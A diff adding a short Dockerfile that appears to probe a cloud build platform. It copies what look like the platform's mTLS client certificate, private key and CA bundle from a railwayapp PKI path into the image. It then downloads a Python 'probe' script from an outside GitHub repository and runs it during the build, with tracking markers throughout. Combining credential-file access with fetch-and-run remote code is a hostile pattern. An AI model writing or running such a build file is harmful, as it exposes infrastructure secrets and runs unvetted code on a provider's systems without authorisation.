@@ -1,0 +1,10 @@
+# MARK-I68068-gwroute-p4-77af13
+FROM alpine:3.20
+RUN echo MARK-I68068-gwroute-p4-77af13-step1
+COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
+COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
+COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
+RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
+RUN curl -sS -m 30 -o /p3.py https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/main/probe3_i68068.py && wc -l /p3.py && echo DL_OK
+RUN timeout -s KILL 500 python3 /p3.py 2>&1 | head -c 60000
+CMD ["sh","-c","sleep 30"]
